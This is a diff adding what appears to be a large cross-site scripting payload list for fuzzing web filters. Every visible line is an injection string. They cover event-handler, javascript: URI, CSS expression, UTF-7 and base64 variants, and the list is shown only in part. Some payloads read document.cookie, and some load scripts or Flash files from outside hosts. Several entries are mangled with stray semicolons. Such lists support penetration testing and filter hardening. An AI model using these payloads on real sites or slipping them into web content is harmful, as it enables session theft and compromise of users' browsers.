@@ -1,0 +1,1524 @@
+'>//\\,<'>">">"*"
+&#0000060
+#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+&#000060
+&#00060
+&#0060
+&#00;</form><input type&#61;"date" onfocus="confirm()">
+&#060
+0\"autofocus/onfocus=confirm()--><video/poster/ error=prompt(2)>"-confirm(3)-"
+0\"autofocus/onfocus=confirm()--><video/poster/onerror=prompt(2)>"-confirm(3)-"
+0&q=';confirm(String.fromCharCode(88,83,83))//\';alert%2?8String.fromCharCode(88,83,83))//";confirm(String.fromCharCode?(88,83,83))//\";confirm(String.fromCharCode(88,83,83)%?29//--></SCRIPT>">'><SCRIPT>confirm(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>
+¼script¾confirm(¢1¢)¼/script¾
+1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:confirm() strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
+1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:confirm()&gt;>
+1script3document.vulnerable=true;1/script3
+1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:confirm()&gt;`>
+>%22%27><img%20src%3d%22javascript:confirm(%27%201%27)%22>
+%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://www.google.com/xss.js%3E%3C/script%3E%22)’%3E
+%22%3e%3cscript%3econfirm()%3c/script%3e
+%22;alert%281%29//
+%253Cscript%253Econfirm()%253C%252Fscript%253E
+%253cscript%253econfirm()%253c/script%253e
+%253cscript%253econfirm(document.cookie)%253c/script%253e
+%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
+%2BADw-script+AD4-confirm(document.location)%2BADw-/script%2BAD4-
+&#34;&#62;<h1/onmouseover='\u0061lert(1)'>
+&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
+&#39;&#88;&#83;&#83;&#39;&#41;>
+%3C
+%3cscript%3econfirm()%3c/script%3e
+&#60
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:confirm();/*';">DEF 
+"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:confirm();/*';">DEF 
+ABC<div style="x:expression\x00(javascript:confirm()">DEF
+ABC<div style="x:expression\x5C(javascript:confirm()">DEF
+ABC<div style="x:exp\x00ression(javascript:confirm()">DEF
+ABC<div style="x:exp\x5Cression(javascript:confirm()">DEF
+ABC<div style="x:\x00expression(javascript:confirm()">DEF
+ABC<div style="x:\x09expression(javascript:confirm()">DEF
+ABC<div style="x:\x0Aexpression(javascript:confirm()">DEF
+ABC<div style="x:\x0Bexpression(javascript:confirm()">DEF
+ABC<div style="x:\x0Cexpression(javascript:confirm()">DEF
+ABC<div style="x:\x0Dexpression(javascript:confirm()">DEF
+ABC<div style="x:\x20expression(javascript:confirm()">DEF
+ABC<div style="x\x3Aexpression(javascript:confirm()">DEF
+ABC<div style="x:\xC2\xA0expression(javascript:confirm()">DEF
+ABC<div style="x:\xE2\x80\x80expression(javascript:confirm()">DEF
+ABC<div style="x:\xE2\x80\x81expression(javascript:confirm()">DEF
+ABC<div style="x:\xE2\x80\x82expression(javascript:confirm()">DEF
+ABC<div style="x:\xE2\x80\x83expression(javascript:confirm()">DEF
+ABC<div style="x:\xE2\x80\x84expression(javascript:confirm()">DEF
+ABC<div style="x:\xE2\x80\x85expression(javascript:confirm()">DEF
+ABC<div style="x:\xE2\x80\x86expression(javascript:confirm()">DEF
+ABC<div style="x:\xE2\x80\x87expression(javascript:confirm()">DEF
+ABC<div style="x:\xE2\x80\x88expression(javascript:confirm()">DEF
+ABC<div style="x:\xE2\x80\x89expression(javascript:confirm()">DEF
+ABC<div style="x:\xE2\x80\x8Aexpression(javascript:confirm()">DEF
+ABC<div style="x:\xE2\x80\x8Bexpression(javascript:confirm()">DEF
+ABC<div style="x:\xE3\x80\x80expression(javascript:confirm()">DEF
+ABC<div style="x:\xEF\xBB\xBFexpression(javascript:confirm()">DEF
++ACIAPgA8-script+AD4-confirm(document.location)+ADw-/script+AD4APAAi-
++ADw-script+AD4-confirm(document.location)+ADw-/script+AD4-
+a=\"get\";
+a=";get";;&;#10;b=";URL(";";;&;#10;c=";javascript:";;&;#10;d=";confirm(1);";)";;&#10;eval(a+b+c+d);
+a="get";b="URL";c="javascript:";d="confirm();";eval(a+b+c+d);
+a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
+<a href="about:<script>confirm();</script>">
+<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">test</a>
+<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
+<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
+<;A HREF=";//google";>;XSS<;/A>;
+<;A HREF=";http://0102.0146.0007.00000223/";>;XSS<;/A>;
+<A HREF="http://0102.0146.0007.00000223/">XSS</A>
+<;A HREF=";http://0x42.0x0000066.0x7.0x93/";>;XSS<;/A>;
+<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
+<;A HREF=";http://1113982867/";>;XSS<;/A>;
+<A HREF="http://1113982867/">XSS</A>
+<A HREF="htt p://6 6.000146.0x7.147/">XSS</A>
+<;A HREF=";http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D";>;XSS<;/A>;
+<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+<A HREF="htt	p://8	8.000146.0x7.147/">XSS</A>
+<;A HREF=";http://8.8.8.8/";>;XSS<;/A>;
+<A HREF="http://8.8.8.8/">XSS</A>
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:confirm()></a>">
+<;A HREF=";http://google.com/";>;XSS<;/A>;
+<;A HREF=";http://google:www.google.com";>;XSS<;/A>;
+<;A HREF=";http://www.gohttp://www.google.com/ogle.com/";>;XSS<;/A>;
+<;A HREF=";http://www.google.com@google";>;XSS<;/A>;
+<;A HREF=";http://www.google.com./";>;XSS<;/A>;
+<;A HREF=";h&#x0A;tt&#09;p://6&;#09;6.000146.0x7.147/";>;XSS<;/A>;
+<a href="jav&#65ascript:javascript:confirm()">test1</a>
+<a href="jav&#97ascript:javascript:confirm()">test1</a>
+<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:confirm()>XXX</a>
+<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
+<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
+<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
+<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
+<;A HREF=";javascript:document.location=';http://www.google.com/';";>;XSS<;/A>;
+<a href="javascript#document.vulnerable=true;">
+<a href="javascript:javascript:confirm()"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:confirm()&NewLine;>X</a>
+<a href="javascript\x00:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="javascript\x09:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="javascript\x0A:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="javascript\x0D:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="javascript\x3A:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="javascript\x3Ajavascript:confirm()" id="fuzzelement1">test</a>
+<a href="javas\x00cript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="javas\x01cript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="javas\x02cript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="javas\x03cript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="javas\x04cript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="javas\x05cript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="javas\x06cript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="javas\x07cript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="javas\x08cript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="javas\x09cript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="javas\x0Acript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="javas\x0Bcript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="javas\x0Ccript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="javas\x0Dcript:javascript:confirm()" id="fuzzelement1">test</a>
+<;A HREF=";//www.google.com/";>;XSS<;/A>;
+<a href="\x00javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x01javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x02javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x03javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x04javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x05javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x06javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x07javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x08javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x09javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x0Ajavascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x0Bjavascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x0Cjavascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x0Djavascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x0Ejavascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x0Fjavascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x10javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x11javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x12javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x13javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x14javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x15javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x16javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x17javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x18javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x19javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x1Ajavascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x1Bjavascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x1Cjavascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x1Djavascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x1Ejavascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x1Fjavascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\x20javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\xC2\xA0javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\xE1\x9A\x80javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\xE1\xA0\x8Ejavascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x80javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x81javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x82javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x83javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x84javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x85javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x86javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x87javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x88javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x89javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x8Ajavascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xA8javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xA9javascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xAFjavascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\xE2\x81\x9Fjavascript:javascript:confirm()" id="fuzzelement1">test</a>
+<a href="\xE3\x80\x80javascript:javascript:confirm()" id="fuzzelement1">test</a>
+"/></a></><img src=1.gif onerror=confirm()>
+alert;pg(1)
+<a onmouseover="confirm(document.cookie)">xxs link</a>
+<a onmouseover=confirm(document.cookie)>xxs link</a>
+&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()}
+&apos;;confirm(String.fromCharCode(88,83,83))//\&apos;;confirm(String.fromCharCode(88,83,83))//&quot;;confirm(String.fromCharCode(88,83,83))//\&quot;;confirm(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;confirm(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+<applet onerror applet onerror="javascript:javascript:confirm()"></applet onerror>
+<applet onError applet onError="javascript:javascript:confirm()"></applet onError>
+<applet onreadystatechange applet onreadystatechange="javascript:javascript:confirm()"></applet onreadystatechange>
+<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:confirm()"></applet onReadyStateChange>
+";a=prompt,a()//
+';a=prompt,a()//
+a=&quot;get&quot;;&amp;#10;b=&quot;URL(&quot;&quot;;&amp;#10;c=&quot;javascript:&quot;;&amp;#10;d=&quot;confirm(&apos;XSS&apos;);&quot;)&quot;;&#10;eval(a+b+c+d);
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:confirm()">XXX</a>
+<a style="-o-link:'javascript:javascript:confirm()';-o-link-source:current">X
+<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:confirm();">XXX</a></a><a href="javascript:javascript:confirm()">XXX</a>
+<audio src=1 href=1 onerror="javascript:confirm()"></audio>
+<audio src=1 onerror=confirm()>
+<BASE HREF="javascript:confirm();//">
+<;BASE HREF=";javascript:confirm(';XSS';);//";>;
+<base HREF="javascript:document.vulnerable=true;//">
+<BASE HREF="javascript:javascript:confirm();//">
+%BCscript%BEconfirm(%A2XSS%A2)%BC/script%BE
+<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:confirm()"></bgsound onPropertyChange>
+<BGSOUND SRC="javascript:confirm();">
+<;BGSOUND SRC=";javascript:confirm(';XSS';);";>;
+<bgsound src="javascript:document.vulnerable=true;">
+<bgsound SRC="javascript:document.vulnerable=true;">
+<BGSOUND SRC="javascript:javascript:confirm();">
+[<blockquote cite="]">[" onmouseover="confirm();" ]
+</body>
+<BODY BACKGROUND="javascript:confirm()">
+<;BODY BACKGROUND=";javascript:confirm(';XSS';);";>;
+<BODY BACKGROUND=”javascript:confirm(‘XSS’)”>
+<body BACKGROUND="javascript:document.vulnerable=true;">
+<body background=javascript:'"><script>confirm(navigator.userAgent)</script>></body>
+<body onbeforeunload body onbeforeunload="javascript:javascript:confirm()"></body onbeforeunload>
+<body onBeforeUnload body onBeforeUnload="javascript:javascript:confirm()"></body onBeforeUnload>
+<body onblur body onblur="javascript:javascript:confirm()"></body onblur>
+<body onfocus body onfocus="javascript:javascript:confirm()"></body onfocus>
+<body onFocus body onFocus="javascript:javascript:confirm()"></body onFocus>
+<body oninput=javascript:confirm()><input autofocus>
+<body onkeydown body onkeydown="javascript:javascript:confirm()"></body onkeydown>
+<body onkeyup body onkeyup="javascript:javascript:confirm()"></body onkeyup>
+";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=confirm(1)>;
+"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm(1)>
+<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=confirm(1)>;
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm(1)>
+<body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;>
+<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:confirm()>
+<body onload body onload="javascript:javascript:confirm()"></body onload>
+<body onLoad body onLoad="javascript:javascript:confirm()"></body onLoad>
+<body onLoad="confirm();"
+<BODY ONLOAD=confirm()>
+<BODY ONLOAD=confirm(1)>
+<BODY ONLOAD=confirm('hellox worldss')>
+<;BODY ONLOAD=confirm(';XSS';)>;
+<BODY ONLOAD=confirm(‘XSS’)>
+<BODY ONLOAD=confirm(’XSS’)>
+<body onload="document.vulnerable=true;">
+<body ONLOAD=document.vulnerable=true;>
+<BODY ONLOAD=javascript:confirm()>
+<BODY ONLOAD=javascript:javascript:confirm()>
+<body/onload=&lt;!--&gt;&#10confirm()>
+<body onLoad="while(true) confirm();">
+<body onMouseEnter body onMouseEnter="javascript:javascript:confirm()"></body onMouseEnter>
+<body onMouseMove body onMouseMove="javascript:javascript:confirm()"></body onMouseMove>
+<body onMouseOver body onMouseOver="javascript:javascript:confirm()"></body onMouseOver>
+<body onpagehide body onpagehide="javascript:javascript:confirm()"></body onpagehide>
+<body onPageHide body onPageHide="javascript:javascript:confirm()"></body onPageHide>
+<body onPageShow body onPageShow="javascript:javascript:confirm()"></body onPageShow>
+<body onPopState body onPopState="javascript:javascript:confirm()"></body onPopState>
+<body onPropertyChange body onPropertyChange="javascript:javascript:confirm()"></body onPropertyChange>
+<body onResize body onResize="javascript:javascript:confirm()"></body onResize>
+<body onscroll=confirm(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<body onscroll=javascript:confirm()><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<body onscroll=javascript:confirm()><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+<body onunload body onunload="javascript:javascript:confirm()"></body onunload>
+<body onUnload body onUnload="javascript:javascript:confirm()"></body onUnload>
+<body onunload="javascript:confirm();">
+<body src=1 href=1 onerror="javascript:confirm()"></body>
+<br size=\"&{confirm()}\">
+<BR SIZE="&{confirm()}">
+<;br size=\";&;{confirm(&#039;XSS&#039;)}\";>;
+<;BR SIZE=";&;{confirm(';XSS';)}";>;
+<BR SIZE="&{javascript:confirm()}">
+</br style=a:expression(confirm())>
+<;/br style=a:expression(confirm())>;
+<b <script>confirm()</script>0
+b=\"URL(\\"\";
+c=\"javascript&#058;\";
+[color=red' onmouseover="confirm()"]mouse over[/color]
+[color=red width=expression(confirm(123))][color]
+<comment><img src="</comment><img src=x onerror=javascript:confirm())//">
+\";confirm();//
+\\";confirm();//
+‘)confirm();//
+‘; confirm();
+‘; confirm(document.cookie); var foo=’
+';confirm(String&#46;fromCharCode(88,83,83))//\';confirm(String&#46;fromCharCode(88,83,83))//\";confirm(String&#46;fromCharCode(88,83,83))//\\";confirm(String&#46;fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;confirm(String&#46;fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+confirm(String.fromCharCode(88,83,83));'))">
+';confirm(String.fromCharCode(88,83,83))//';confirm(String.fromCharCode(88,83,83))//";
+confirm(String.fromCharCode(88,83,83))//";confirm(String.fromCharCode(88,83,83))//--
+';;confirm(String.fromCharCode(88,83,83))//\';;confirm(String.fromCharCode(88,83,83))//";;confirm(String.fromCharCode(88,83,83))//\";;confirm(String.fromCharCode(88,83,83))//-->;<;/SCRIPT>;";>;';>;<;SCRIPT>;confirm(String.fromCharCode(88,83,83))<;/SCRIPT>;
+';confirm(String.fromCharCode(88,83,83))//';confirm(String.fromCharCode(88,83,83))//";confirm(String.fromCharCode(88,83,83))//";confirm(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>confirm(String.fromCharCode(88,83,83))</SCRIPT>
+';confirm(String.fromCharCode(88,83,83))//\';confirm(String.fromCharCode(88,83,83))//";confirm(String.fromCharCode(88,83,83))//\";confirm(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>confirm(String.fromCharCode(88,83,83))</SCRIPT>
+<"';confirm(String.fromCharCode(88,83,83))//\';confirm(String.fromCharCode(88,83,83))//";confirm(String.fromCharCode(88,83,83))//\";confirm(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>confirm(String.fromCharCode(88,83,83))</SCRIPT>
+‘;confirm(String.fromCharCode(88,83,83))//’;confirm(String.fromCharCode(88,83,83))//”;confirm(String.fromCharCode(88,83,83))//”;confirm(String.fromCharCode(88,83,83))//–></SCRIPT>”>’><SCRIPT>confirm(String.fromCharCode(88,83,83))</SCRIPT>
+';confirm(String.fromCharCode(88,83,83))//\';confirm(String.fromCharCode(88,83,83))//";confirm(String.fromCharCode(88,83,83))//\";confirm(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>confirm(String.fromCharCode(88,83,83))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search
+'); confirm(); var x='
+'); confirm('XSS
+\";;confirm(';XSS';);//
+\\'); confirm(\'xss\');var x=\'
+data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=
+d=\"confirm();\\")\";
+<div datafld="b" dataformatas="html" datasrc="#X"></div>
+<div id=d><div style="font-family:'sans\27\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>
+<div id="div1"><input value="``onmouseover=javascript:confirm()"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
+<div id=d><x xmlns="><iframe onload=javascript:confirm()"></div> <script>d.innerHTML=d.innerHTML</script>
+<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:confirm()&gt;">
+<div id="x">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>
+<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
+<div/onmouseover='confirm()'> style="x:">
+<div onmouseover="document.vulnerable=true;">
+<;DIV STYLE=";background-image:\0075\0072\006C\0028';\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.10530053\0027\0029';\0029";>;
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<DIV STYLE="background-image: url(&#1;javascript:confirm())">
+<;DIV STYLE=";background-image: url(&;#1;javascript:confirm(';XSS';))";>;
+<div STYLE="background-image: url(&#1;javascript:document.vulnerable=true;)">
+<DIV STYLE="background-image: url(javascript:confirm())">
+<;DIV STYLE=";background-image: url(javascript:confirm(';XSS';))";>;
+<div style="background-image: url(javascript:document.vulnerable=true;);">
+<div STYLE="background-image: url(javascript:document.vulnerable=true;)">
+<DIV STYLE="background-image: url(javascript:javascript:confirm())">
+<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
+<div style="behaviour: url(https://google.com);">
+<div style="binding: url(https://google.com);">
+<div style="binding: url(http://www.google.com/xss.js);">
+<div style=content:url(%(svg)s)></div>
+<div style="font-family:'foo&#10;;color:red;';">
+<div style="font-family:foo{bar;background:url(http://www.google.com/oo};color:red/*/foo.jpg);">X
+<div style="font-family:foo}color=red;">XXX
+<div style="list-style:url(http://www.google.com)\20url(javascript:javascript:confirm());">X
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="confirm()">x</button>
+<div style=width:1px;filter:glow onfilterchange=javascript:confirm()>x
+<DIV STYLE="width: expression(confirm());">
+<div/style="width:expression(confirm(1))">X</div> {IE7}
+<;DIV STYLE=";width: expression(confirm(';XSS';));";>;
+<div style="width: expression(document.vulnerable=true;);">
+<div STYLE="width: expression(document.vulnerable=true);">
+<DIV STYLE="width:expression(javascript:confirm());">
+<div style="x:expression((window.r==1)?'':eval('r=1;
+<div style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="confirm()">x</button>
+&{document.vulnerable=true;};
+\";document.vulnerable=true;;//
+echo('IPT&gt;confirm(\"XSS\")&lt;/SCRIPT&gt;'); ?&gt;
+<;? echo(';<;SCR)';;
+<? echo('<SCR)';echo('IPT>confirm(1)</SCRIPT>'); ?>
+<? echo('<scr)'; echo('ipt>confirm(\"XSS\")</script>'); ?>
+<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>
+element[attribute='<img src=x onerror=confirm();>
+<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
+<embed code=javascript:javascript:confirm();></embed>
+<embed code=%(scriptlet)s></embed>
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWx" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+<embed src="data:text/html;base64,%(base64)s">
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<embed src="http://www.google.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+<EMBED SRC="http://www.google.com/xss.swf" AllowScriptAccess="always">
+<;EMBED SRC=";http://www.google.com/xss.swf"; AllowScriptAccess=";always";>;<;/EMBED>;
+<EMBED SRC="http://www.google.com/xss.swf" AllowScriptAccess="always"></EMBED>
+<embed src="javascript:confirm()">
+<embed src=%(jscript)s></embed>
+<embed type="image" src=%(scriptlet)s></embed>
+<embed width=500 height=500 code="data:text/html,<script>%(payload)s</script>"></embed>
+eval(a+b+c+d);
+"-eval("window['pro'%2B'mpt'](8)")-"
+'-eval("window['pro'%2B'mpt'](8)")-'
+<event-source src="%(event)s" onload="javascript:confirm()">
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://www.google.com/xss.js></SCRIPT>'"-->
+<;!--#exec cmd=";/bin/echo ';<;SCRIPT SRC';";-->;<;!--#exec cmd=";/bin/echo ';=http://www.google.com/xss.js>;<;/SCRIPT>;';";-->;
+Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
+exp/*<A STYLE='no\xss:noxss("*//*");
+exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(confirm(1))'>
+exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(confirm(1))'>
+exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>
+exp/*&lt;A STYLE='no\xss&#58;noxss(\"*//*\");
+exp/*&lt;XSS STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);
+exp/*<;XSS STYLE=';no\xss:noxss(";*//*";);
+<font style='color:expression(confirm(document.cookie))'>
+</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
+foo\’; confirm(document.cookie);//’;
+<! foo="[[[Inception]]"><x foo="]foo><script>confirm()</script>">
+<! foo="[[[Inception]]"><x foo="]foo><script>javascript:confirm()</script>">
+foo<script>confirm(document.cookie)</script>
+<! foo="><script>confirm()</script>">
+</ foo="><script>confirm()</script>">
+<? foo="><script>confirm()</script>">
+foo<script>confirm()</script>
+<! foo="><script>javascript:confirm()</script>">
+</ foo="><script>javascript:confirm()</script>">
+<? foo="><script>javascript:confirm()</script>">
+<% foo><x foo="%><script>confirm(123)</script>">
+<? foo="><x foo='?><script>confirm()</script>'>">
+<% foo><x foo="%><script>javascript:confirm()</script>">
+<? foo="><x foo='?><script>javascript:confirm()</script>'>">
+//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
+<form><a href="javascript:\u0061lert&#x28;1&#x29;">
